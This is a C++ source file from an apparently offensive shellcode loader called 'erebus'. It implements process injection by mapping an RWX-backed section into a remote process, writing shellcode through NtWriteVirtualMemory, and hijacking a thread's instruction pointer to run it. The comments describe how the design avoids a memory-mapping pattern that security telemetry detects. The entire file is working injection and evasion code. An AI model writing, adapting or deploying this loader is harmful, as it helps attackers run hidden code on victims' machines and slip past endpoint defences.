#include "../../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 1
	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		LOG_INFO("Injection via. NtMapViewOfSection");

		HANDLE section_handle;
		LARGE_INTEGER section_size = { shellcode_size };

		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
		ImportFunction(ntdll, NtCreateSection, typeNtCreateSection);
		ImportFunction(ntdll, NtMapViewOfSection, typeNtMapViewOfSection);
		ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
		ImportFunction(ntdll, NtClose, typeNtClose);

		// Pagefile-backed nameless section. Max protection stays RWX because
		// NtMapViewOfSection cannot raise a view above the section max, and we
		// need both a writable path (via NtWriteVirtualMemory) and an
		// executable remote view.
		NTSTATUS status = NtCreateSection(
			&section_handle,
			SECTION_ALL_ACCESS,
			NULL,
			&section_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to create section (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("Section created");

		// Map to remote process directly as PAGE_EXECUTE_READ. No local view
		// is ever created - previous revisions mapped the section RW in the
		// current process, memcpy'd, then mapped it RX remotely, which leaves
		// a recognisable "double-map w/ protection downgrade" pattern in
		// NtMapViewOfSection telemetry. We now write to the remote view via
		// NtWriteVirtualMemory, which the kernel services by temporarily
		// unprotecting at the PTE level (allowed because section max is RWX).
		PVOID remote_address = NULL;
		SIZE_T remote_view_size = shellcode_size;

		status = NtMapViewOfSection(
			section_handle,
			process_handle,
			&remote_address,
			NULL,
			NULL,
			NULL,
			&remote_view_size,
			(SECTION_INHERIT)ViewShare,
			NULL,
			PAGE_EXECUTE_READ
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to map view to remote process (NTSTATUS: 0x%08X)", status);
			NtClose(section_handle);
			return;
		}

		// Write shellcode into the remote RX view. NtWriteVirtualMemory
		// bypasses the view protection for section-backed pages because the
		// section max allows writes.
		SIZE_T bytes_written = 0;
		status = NtWriteVirtualMemory(
			process_handle,
			remote_address,
			shellcode,
			shellcode_size,
			&bytes_written
		);
		if (!NT_SUCCESS(status) || bytes_written != shellcode_size) {
			LOG_ERROR("NtWriteVirtualMemory failed (NTSTATUS: 0x%08X)", status);
			NtUnmapViewOfSection(process_handle, remote_address);
			NtClose(section_handle);
			return;
		}

		LOG_SUCCESS("Mapped to remote process at: 0x%08pX", remote_address);

		// Get thread context and hijack RIP
		LPCONTEXT context_ptr = new CONTEXT();
		context_ptr->ContextFlags = CONTEXT_FULL;
		
		if (!GetThreadContext(thread_handle, context_ptr)) {
			LOG_ERROR("Failed to get thread context (Code: 0x%08lX)", GetLastError());
			delete context_ptr;
			NtUnmapViewOfSection(process_handle, remote_address);
			NtClose(section_handle);
			return;
		}

		// Hijack instruction pointer to shellcode
#ifdef _WIN64
		context_ptr->Rip = (DWORD64)remote_address;
#else
		context_ptr->Eip = (DWORD)remote_address;
#endif

		if (!SetThreadContext(thread_handle, context_ptr)) {
			LOG_ERROR("Failed to set thread context (Code: 0x%08lX)", GetLastError());
			delete context_ptr;
			NtUnmapViewOfSection(process_handle, remote_address);
			NtClose(section_handle);
			return;
		}

		LOG_SUCCESS("Thread context hijacked to: 0x%08pX", remote_address);

		delete context_ptr;

		// Resume thread to execute shellcode
		status = NtResumeThread(thread_handle, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
		}
		else {
			LOG_SUCCESS("Thread resumed, shellcode executing");
		}

		// Cleanup: no local mapping to tear down, just close the section.
		// The remote view stays mapped in the target until its process exits
		// or the shellcode unmaps itself.
		NtClose(section_handle);
		NtClose(process_handle);
		NtClose(thread_handle);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
#endif
} // namespace erebus
